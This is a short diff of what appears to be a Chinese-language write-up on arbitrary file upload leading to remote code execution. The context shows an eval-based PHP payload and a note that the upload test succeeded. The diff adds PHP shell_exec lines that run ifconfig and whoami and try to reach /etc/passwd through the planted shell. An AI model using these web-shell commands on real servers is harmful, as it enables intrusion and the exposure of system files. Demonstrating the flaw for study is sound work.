@@ -12,3 +12,6 @@ eval($code); ?>
 ```
 當你看到這頁面就知道程式運行成功，看起來可以做其他測試
 ![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/7dbac24e-7e55-4050-8014-0b1ab115f15c)
++ echo shell_exec('/sbin/ifconfig eth0');
++ echo shell_exec('whoami');
++ echo shell_exec('/etc/passwd');
